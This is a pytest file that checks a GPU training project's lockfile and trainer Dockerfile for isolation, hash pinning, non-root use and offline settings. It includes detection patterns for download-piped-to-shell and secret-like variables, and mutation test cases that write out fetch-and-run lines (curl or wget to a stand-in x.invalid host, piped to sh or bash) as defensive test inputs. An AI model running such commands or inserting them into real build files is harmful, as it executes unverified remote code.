"""OPE-579 GPU training lock boundary. Static file checks only: no install, network or GPU.

Passing here proves only that the lock and image recipe are isolated and hash-pinned. It is
component evidence, not GPU qualification (training/gpu/README.md).
"""

from __future__ import annotations

import json
import re
import tomllib
from fnmatch import fnmatch
from pathlib import Path

import pytest

from tools import bootstrap

ROOT = Path(__file__).resolve().parents[2]
GPU = ROOT / "training/gpu"
GPU_REL = "training/gpu"
GPU_PROJECT = "opentour-training-gpu"
CPU_LOCKS = ("uv.lock", "training/uv.lock")
GPU_ONLY_NAMES = {
    "torch",
    "triton",
    "bitsandbytes",
    "transformers",
    "peft",
    "accelerate",
    "safetensors",
}
GPU_ONLY_PREFIXES = ("nvidia-", "cuda-")
DIRECT_PINS = {
    "torch": "2.14.1",
    "transformers": "5.23.0",
    "peft": "0.21.3",
    "bitsandbytes": "0.50.2",
    "accelerate": "1.15.0",
    "safetensors": "0.8.0",
    "tokenizers": "0.23.3",
    "cuda-toolkit": "13.0.3.0",
    "nvidia-cuda-runtime": "13.0.96",
    "nvidia-cudnn-cu13": "9.24.0.43",
}
LINUX_X86_64 = "platform_machine == 'x86_64' and sys_platform == 'linux'"
DIGEST_REF = re.compile(r"^[a-z0-9./_-]+(?::[A-Za-z0-9._-]+)?@sha256:[0-9a-f]{64}$")


def toml(relative: str) -> dict:
    return tomllib.loads((ROOT / relative).read_text())


def gpu_lock() -> dict:
    return toml(f"{GPU_REL}/uv.lock")


def is_gpu_only(name: str) -> bool:
    return name in GPU_ONLY_NAMES or name.startswith(GPU_ONLY_PREFIXES)


def test_gpu_project_is_excluded_from_the_root_workspace():
    workspace = toml("pyproject.toml")["tool"]["uv"]["workspace"]
    assert not any(fnmatch(GPU_REL, pattern) for pattern in workspace["members"])
    assert "training" in workspace["exclude"]
    # uv stops at the nearest enclosing project; training/ must never become a workspace root.
    assert "workspace" not in toml("training/pyproject.toml").get("tool", {}).get("uv", {})
    assert "workspace" not in toml(f"{GPU_REL}/pyproject.toml")["tool"]["uv"]
    root_lock = toml("uv.lock")
    assert GPU_PROJECT not in root_lock["manifest"].get("members", [])
    for relative in CPU_LOCKS:
        assert GPU_PROJECT not in {p["name"] for p in toml(relative)["package"]}


def test_setup_and_control_images_never_reference_the_gpu_project():
    assert not any(path.startswith(GPU_REL) for path in (*bootstrap.LOCKS, *bootstrap.MANIFESTS))
    assert GPU_REL not in (ROOT / "justfile").read_text()
    assert GPU_REL not in (ROOT / "tools/bootstrap.py").read_text()
    # The root container context is an explicit allowlist; it must not admit the GPU lock.
    assert not any(GPU_REL in line for line in (ROOT / ".dockerignore").read_text().splitlines())
    assert (
        json.loads((ROOT / "tools/toolchain.json").read_text())["setup_boundary"]["learning_lock"]
        == "training/uv.lock"
    )


def test_gpu_lock_exists_with_hashes_for_every_artifact():
    lock = gpu_lock()
    assert lock["requires-python"] == "==3.12.16"
    assert lock["supported-markers"] == [LINUX_X86_64]
    assert lock["required-markers"] == [LINUX_X86_64]
    packages = [p for p in lock["package"] if p["name"] != GPU_PROJECT]
    assert len(packages) >= len(DIRECT_PINS)
    for package in packages:
        assert package["source"] == {"registry": "https://pypi.org/simple"}, package["name"]
        # no-build: every package must install from a hashed wheel.
        assert package["wheels"], package["name"]
        for artifact in [*package["wheels"], *([package["sdist"]] if "sdist" in package else [])]:
            assert re.fullmatch(r"sha256:[0-9a-f]{64}", artifact["hash"]), package["name"]
            assert artifact["url"].startswith("https://files.pythonhosted.org/"), package["name"]


def test_gpu_lock_pins_the_cuda_training_stack_exactly():
    project = toml(f"{GPU_REL}/pyproject.toml")
    config = project["tool"]["uv"]
    assert config["package"] is False and config["no-build"] is True
    for requirement in project["project"]["dependencies"]:
        assert re.fullmatch(r"[a-z0-9-]+(\[[a-z,]+\])?==[0-9][0-9.]*", requirement), requirement
    versions = {p["name"]: p["version"] for p in gpu_lock()["package"]}
    for name, version in DIRECT_PINS.items():
        assert versions[name] == version, name
    torch = next(p for p in gpu_lock()["package"] if p["name"] == "torch")
    assert [w["url"].rsplit("/", 1)[1] for w in torch["wheels"]] == [
        "torch-2.14.1-cp312-cp312-manylinux_2_28_x86_64.whl"
    ]
    # The CUDA runtime arrives as locked wheels, not from the control workspace.
    assert {"nvidia-cuda-runtime", "nvidia-cublas", "nvidia-cudnn-cu13"} <= set(versions)


@pytest.mark.parametrize("relative", CPU_LOCKS)
def test_no_cuda_or_torch_package_in_control_locks(relative):
    names = {p["name"] for p in toml(relative)["package"]}
    assert not {name for name in names if is_gpu_only(name)}
    assert "download.pytorch.org" not in (ROOT / relative).read_text()


def test_is_gpu_only_catches_the_gpu_lock_contents():
    """Adverse control: the denylist must flag the packages that do exist in the GPU lock."""
    flagged = {p["name"] for p in gpu_lock()["package"] if is_gpu_only(p["name"])}
    assert {"torch", "triton", "bitsandbytes", "cuda-toolkit", "nvidia-cudnn-cu13"} <= flagged


def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
    text = (GPU / "trainer.Dockerfile").read_text()
    toolchain = json.loads((ROOT / "tools/toolchain.json").read_text())
    args = dict(re.findall(r"^ARG (\w+)=(\S+)$", text, re.M))
    assert DIGEST_REF.fullmatch(args["CUDA_BASE_IMAGE"])
    # The base flavour carries no cuBLAS/NCCL that could shadow the locked wheels.
    assert args["CUDA_BASE_IMAGE"].startswith("docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04@")
    assert args["UV_IMAGE"] == toolchain["bootstrap_images"]["uv"]
    assert "TODO" not in text
    assert re.findall(r"^FROM (\S+)", text, re.M) == [
        "${UV_IMAGE}",
        "${CUDA_BASE_IMAGE}",
        "${CUDA_BASE_IMAGE}",
    ]
    python = toolchain["tools"]["python"]["artifacts"]["Linux-x86_64"]
    assert f"--checksum=sha256:{python['sha256']}" in text
    assert python["url"] in text
    # The only build-context inputs are the lock pair; the only download is checksum-pinned.
    assert re.findall(r"^COPY (?!--from=)(.*)$", text, re.M) == ["pyproject.toml uv.lock ./"]
    assert re.findall(r"^ADD (\S+)", text, re.M) == [f"--checksum=sha256:{python['sha256']}"]
    assert "uv export --locked" in text
    assert "--require-hashes --no-deps --no-build" in text
    assert "uv sync" not in text and "pip install " not in text.replace("uv pip install ", "")
    users = re.findall(r"^USER (\S+)$", text, re.M)
    assert users == ["10001:10001"]
    assert text.index("USER 10001:10001") > text.rindex("RUN ")
    for offline in ("HF_HUB_OFFLINE=1", "TRANSFORMERS_OFFLINE=1", "PIP_NO_INDEX=1"):
        assert offline in text
    assert "OPENTOUR_GPU_QUALIFICATION=NOT_RUN" in text
    assert (GPU / ".dockerignore").read_text().splitlines() == ["**", "!pyproject.toml", "!uv.lock"]


PINNED_PYTHON = "/opt/python/bin/python3.12"
SECRET_NAME = re.compile(r"TOKEN|KEY|SECRET|PASSWORD|PASSWD|CREDENTIAL", re.I)
PIPE_TO_SHELL = re.compile(r"\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:ba|da|z|k)?sh\b")
DOWNLOAD = re.compile(r"\b(?:curl|wget)\b")
# A shell, `source` or `.` given a file operand, or a `./file` run, after a download in one step.
EXECUTE_FILE = re.compile(
    r"\b(?:ba|da|z|k)?sh\s+(?!-)\S|\bsource\s+\S|(?:^|[;&|]\s*)\.\s+\S|(?:^|[\s;&|])\./\S"
)


def instructions(text: str) -> list[str]:
    """Dockerfile instructions with comments dropped and backslash continuations joined."""
    lines = [line for line in text.splitlines() if not line.lstrip().startswith("#")]
    return [i.strip() for i in re.sub(r"\\\n", " ", "\n".join(lines)).splitlines() if i.strip()]


def export_command(text: str) -> str:
    """Only the `uv export` command, not the rest of its `&&` chain."""
    step = next((s for s in instructions(text) if "uv export" in s), "")
    return step[step.find("uv export") :].split("&&", 1)[0]


def image_hazards(text: str) -> list[str]:
    hazards = []
    steps = instructions(text)
    if any(PIPE_TO_SHELL.search(step) for step in steps):
        hazards.append("download_piped_to_shell")
    for step in steps:
        download = DOWNLOAD.search(step)
        if download and EXECUTE_FILE.search(step, download.end()):
            hazards.append("download_then_execute")
            break
    # No system package is needed; any apt-get would add an unpinned, unhashed dependency.
    if any(re.search(r"\bapt(?:-get)?\b", step) for step in steps if step.startswith("RUN ")):
        hazards.append("apt_get_present")
    names = [m for s in steps if s.startswith("ARG ") for m in re.findall(r"^ARG (\w+)", s)]
    names += [
        m for s in steps if s.startswith("ENV ") for m in re.findall(r"(?:^ENV |\s)(\w+)=", s)
    ]
    # Legacy `ENV NAME value` form: the first operand carries no `=`.
    names += [m.group(1) for s in steps if (m := re.match(r"^ENV (\w+)(?:\s|$)", s))]
    if any(SECRET_NAME.search(name) for name in names):
        hazards.append("secret_like_build_variable")
    export = export_command(text)
    uv_python = any(f"UV_PYTHON={PINNED_PYTHON}" in s for s in steps if s.startswith("ENV "))
    if f"--python {PINNED_PYTHON}" not in export and not uv_python:
        hazards.append("export_without_pinned_python")
    # Both `LD_LIBRARY_PATH=value` and legacy `ENV LD_LIBRARY_PATH value`; quotes stripped.
    values = [
        value.strip("\"'")
        for s in steps
        if s.startswith("ENV ")
        for value in re.findall(r"(?:^ENV |\s)LD_LIBRARY_PATH=(\S+)", s)
        + re.findall(r"^ENV LD_LIBRARY_PATH\s+(\S+)", s)
    ]
    # `$` would inherit the base image's value, which includes /usr/local/cuda/lib64.
    if (
        not values
        or any("$" in value for value in values)
        or any(p.startswith("/usr/local/cuda") for value in values for p in value.split(":"))
    ):
        hazards.append("system_cuda_on_library_path")
    return hazards


def test_trainer_image_has_no_shell_download_apt_secret_or_unpinned_interpreter():
    text = (GPU / "trainer.Dockerfile").read_text()
    assert image_hazards(text) == []
    # Both the flag and the environment pin the interpreter; either alone would suffice.
    assert f"--python {PINNED_PYTHON}" in export_command(text)
    assert f"UV_PYTHON={PINNED_PYTHON}" in text


@pytest.mark.parametrize(
    ("old", "new", "hazard"),
    [
        (
            "RUN mkdir -p /opt/python",
            "RUN curl -fsSL https://x.invalid/i | sh && mkdir -p /opt/python",
            "download_piped_to_shell",
        ),
        (
            "RUN mkdir -p /opt/python",
            "RUN wget -qO- https://x.invalid/i | bash; mkdir -p /opt/python",
            "download_piped_to_shell",
        ),
        (
            "RUN groupadd",
            "RUN apt-get update && apt-get install -y git && groupadd",
            "apt_get_present",
        ),
        ("ARG UV_IMAGE=", "ARG HF_TOKEN\nARG UV_IMAGE=", "secret_like_build_variable"),
        (
            "WORKDIR /home/trainer",
            "ENV HF_TOKEN generated\nWORKDIR /home/trainer",
            "secret_like_build_variable",
        ),
        (
            "RUN mkdir -p /opt/python",
            "RUN curl -fsSL -o /tmp/i https://x.invalid/i && sh /tmp/i && mkdir -p /opt/python",
            "download_then_execute",
        ),
        (
            "RUN mkdir -p /opt/python",
            "RUN wget -O /tmp/i https://x.invalid/i; bash /tmp/i; mkdir -p /opt/python",
            "download_then_execute",
        ),
        (
            "RUN mkdir -p /opt/python",
            "RUN wget -O i https://x.invalid/i && chmod +x i && ./i && mkdir -p /opt/python",
            "download_then_execute",
        ),
        (
            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64:/usr/local/cuda/lib64",
            "system_cuda_on_library_path",
        ),
        (
            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:${LD_LIBRARY_PATH}",
            "system_cuda_on_library_path",
        ),
        (
            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
            'LD_LIBRARY_PATH="/usr/local/cuda/lib64"',
            "system_cuda_on_library_path",
        ),
        (
            "WORKDIR /home/trainer",
            "ENV LD_LIBRARY_PATH /usr/local/cuda/lib64\nWORKDIR /home/trainer",
            "system_cuda_on_library_path",
        ),
        ("UV_LINK_MODE=copy", "UV_LINK_MODE=copy API_KEY=generated", "secret_like_build_variable"),
        (
            "PIP_NO_INDEX=1",
            "PIP_NO_INDEX=1 REGISTRY_PASSWORD=generated",
            "secret_like_build_variable",
        ),
    ],
)
def test_image_hazard_checks_reject_each_mutation(old, new, hazard):
    text = (GPU / "trainer.Dockerfile").read_text()
    assert text.count(old) == 1
    assert hazard in image_hazards(text.replace(old, new))


def test_export_without_pinned_interpreter_is_rejected():
    text = (GPU / "trainer.Dockerfile").read_text()
    unpinned = text.replace(f"--python {PINNED_PYTHON} -o", "-o").replace(
        f"UV_PYTHON={PINNED_PYTHON}", "UV_PYTHON_PREFERENCE=only-system"
    )
    assert unpinned != text
    assert image_hazards(unpinned) == ["export_without_pinned_python"]


def test_readme_names_the_writer_driver_range_and_evidence_limits():
    text = (GPU / "README.md").read_text()
    for required in (
        "OPE-579 lane",
        "must name the",
        "580.65.06",
        "Peak memory",
        "Bounded fit",
        "Fresh-process replay",
        "NF4 QLoRA first",
        "bf16 LoRA",
        "Component evidence only",
    ):
        assert required in text, required
    assert (
        json.loads((ROOT / "tools/toolchain.json").read_text())["gpu_qualification"]["status"]
        == "NOT_RUN"
    )
